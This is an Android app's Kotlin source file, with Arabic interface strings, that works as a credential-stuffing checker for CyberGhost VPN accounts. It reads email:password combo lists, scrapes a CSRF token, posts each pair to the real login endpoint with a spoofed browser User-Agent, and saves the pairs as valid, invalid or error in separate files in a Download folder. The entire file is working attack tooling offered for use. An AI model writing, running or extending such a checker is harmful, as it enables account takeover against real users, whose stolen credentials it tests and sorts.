package com.vanta.cgchecker

import android.content.ContentValues
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.MediaStore
import android.widget.Button
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {
    private val client = OkHttpClient.Builder()
        .connectTimeout(20, TimeUnit.SECONDS)
        .readTimeout(20, TimeUnit.SECONDS)
        .followRedirects(true)
        .build()
        
    private val results = mutableListOf<Triple<String, String, String>>()
    private var combos: List<Pair<String, String>> = emptyList()
    private lateinit var log: TextView
    private lateinit var status: TextView

    private val pickFile = registerForActivityResult(ActivityResultContracts.OpenDocument()) { uri ->
        uri ?: return@registerForActivityResult
        val text = contentResolver.openInputStream(uri)?.bufferedReader()?.readText() ?: ""
        combos = text.lines().mapNotNull { l ->
            val s = l.trim()
            if (s.isEmpty() || s.startsWith("#")) return@mapNotNull null
            val idx = s.indexOfFirst { it == ':' || it == '|' || it == ';' }
            if (idx < 1) return@mapNotNull null
            Pair(s.substring(0, idx).trim(), s.substring(idx + 1).trim())
        }.filter { it.first.isNotEmpty() && it.second.isNotEmpty() }
        status.text = "تم تحميل ${combos.size} حساب"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        log = findViewById(R.id.log)
        status = findViewById(R.id.status)
        findViewById<Button>(R.id.pick).setOnClickListener { pickFile.launch(arrayOf("*/*")) }
        findViewById<Button>(R.id.start).setOnClickListener { runCheck() }
    }

    private fun runCheck() {
        if (combos.isEmpty()) {
            Toast.makeText(this, "اختار ملف أولاً", Toast.LENGTH_SHORT).show()
            return
        }
        results.clear()
        log.text = ""
        lifecycleScope.launch {
            val total = combos.size
            var done = 0
            var valid = 0
            var invalid = 0
            var err = 0
            for ((email, pwd) in combos) {
                val (st, _) = checkOne(email, pwd)
                results.add(Triple(email, pwd, st))
                when (st) {
                    "valid" -> valid++
                    "invalid" -> invalid++
                    else -> err++
                }
                done++
                status.text = "$done/$total   صح $valid   خطأ $invalid   أخطاء $err"
                log.append("$email:$pwd -> $st\n")
                (log.parent as? ScrollView)?.let { sv ->
                    sv.post { sv.fullScroll(ScrollView.FOCUS_DOWN) }
                }
                delay(500)
            }
            saveResults()
            Toast.makeText(this@MainActivity, "خلص — اتحفظ في Download/CyberGhostChecker", Toast.LENGTH_LONG).show()
        }
    }

    private suspend fun checkOne(email: String, pwd: String): Pair<String, String> =
        withContext(Dispatchers.IO) {
            try {
                // 1. جلب CSRF Token
                val getReq = Request.Builder()
                    .url("https://my.cyberghostvpn.com/en_US/login")
                    .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
                    .build()
                
                val getResp = client.newCall(getReq).execute()
                val cookies = getResp.headers("Set-Cookie")
                getResp.close()

                var csrf = ""
                for (c in cookies) {
                    if (c.contains("csrfToken=")) {
                        csrf = c.substringAfter("csrfToken=").substringBefore(";")
                        break
                    }
                }

                if (csrf.isEmpty()) return@withContext "error" to "no_csrf"

                // 2. إرسال بيانات الدخول
                val formBody = FormBody.Builder()
                    .add("email", email)
                    .add("password", pwd)
                    .add("_token", csrf)
                    .build()

                val postReq = Request.Builder()
                    .url("https://my.cyberghostvpn.com/login")
                    .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
                    .header("Content-Type", "application/x-www-form-urlencoded")
                    .header("Origin", "https://my.cyberghostvpn.com")
                    .header("Referer", "https://my.cyberghostvpn.com/en_US/login")
                    .header("Cookie", "csrfToken=$csrf")
                    .post(formBody)
                    .build()

                client.newCall(postReq).execute().use { r ->
                    val body = r.body?.string()?.lowercase() ?: ""
                    val newCookies = r.headers("Set-Cookie").toString().lowercase()
                    
                    if (newCookies.contains("login_web_") || newCookies.contains("remember_web_") || body.contains("logout") || body.contains("sign out") || body.contains("dashboard")) {
                        "valid" to "ok"
                    } else if (body.contains("invalid") || body.contains("credentials") || body.contains("password")) {
                        "invalid" to "wrong_pass"
                    } else {
                        "invalid" to "unknown"
                    }
                }
            } catch (e: Exception) {
                "error" to (e.message ?: "net")
            }
        }

    private suspend fun saveResults() = withContext(Dispatchers.IO) {
        results.groupBy { it.third }.forEach { (st, list) ->
            val content = list.joinToString("\n") { it.first + ":" + it.second }
            writeFile("$st.txt", content)
        }
    }

    private fun writeFile(name: String, content: String) {
        try {
            if (Build.VERSION.SDK_INT >= 29) {
                val values = ContentValues().apply {
                    put(MediaStore.Downloads.DISPLAY_NAME, name)
                    put(MediaStore.Downloads.MIME_TYPE, "text/plain")
                    put(MediaStore.Downloads.RELATIVE_PATH, "Download/CyberGhostChecker")
                    put(MediaStore.Downloads.IS_PENDING, 1)
                }
                val uri = contentResolver.insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, values) ?: return
                contentResolver.openOutputStream(uri)?.use { it.write(content.toByteArray()) }
                values.clear()
                values.put(MediaStore.Downloads.IS_PENDING, 0)
                contentResolver.update(uri, values, null, null)
            } else {
                @Suppress("DEPRECATION")
                val dir = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "CyberGhostChecker")
                dir.mkdirs()
                File(dir, name).writeText(content)
            }
        } catch (_: Exception) {}
    }
}
